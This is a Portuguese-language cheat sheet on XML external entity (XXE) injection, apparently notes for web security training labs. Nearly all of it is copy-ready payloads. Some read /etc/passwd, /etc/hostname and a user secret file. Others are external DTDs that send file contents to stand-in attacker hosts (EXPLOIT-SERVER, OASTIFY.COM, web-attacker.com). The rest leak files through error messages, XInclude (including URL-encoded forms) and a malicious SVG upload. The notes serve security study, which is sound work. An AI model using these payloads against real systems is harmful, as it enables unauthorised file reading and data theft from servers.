# XXE Injection

Probabilidade: $${\color{red}alta}$$.

Escaneie as requisições que envolvem XML com o Burp, seja um scan ativo, seja uma porção específica.

Assim como o SSRF, normalmente aparece no endpoint `/product/stock`.

Também pode aparecer em parâmetros da requisição, mas é menos comum.

![image](https://github.com/user-attachments/assets/b0ce8d8e-5af4-4227-890a-2b2fbcdd8aac)

Payload genérico para ler arquivos:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId>
<storeId>1</storeId></stockCheck>
```

<br>

## Laboratórios

**Blind XXE with Out-of-Band Interaction via XML Parameter Entities**
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

<br>
<br>

**Exploiting Blind XXE to Exfiltrate Data Using a Malicious External DTD**

No servidor de exploit:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://EXPLOIT-SERVER/?x=%file;'>">
%eval;
%exfiltrate;
```

Na requisição:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://YOUR-DTD-URL"> %xxe; ]>
```

<br>

Outra opção, no servidor de exploit:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://EXPLOIT-SERVER/?%file;'>">
```

Na requisição:
```
<!DOCTYPE foo [<!ENTITY % loadDtd SYSTEM "http://YOUR-DTD-URL"> %loadDtd; %stack; %exfil;]>
```

<br>

Versão adaptada:
```
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OASTIFY.COM/?x=%file;'>">
%eval;
%exfil;
```

<br>
<br>

**Exploiting Blind XXE to Retrieve Data via Error Messages**

No servidor de exploit:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Na requisição:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

<br>
<br>

Exploiting XInclude to Retrieve Files
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>

productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```

Versão adaptada:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///home/carlos/secret"/></foo>

# URL Encoded
<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude"><xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/hostname"/></foo>
```

<br>
<br>

**Exploiting XXE via Image File Upload**

Se você fizer o upload de um arquivo `.jpg` e mudar o conteúdo, lembre-se the alterar a extensão e o content type para `image/svg+xml`.
```
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg> 
```
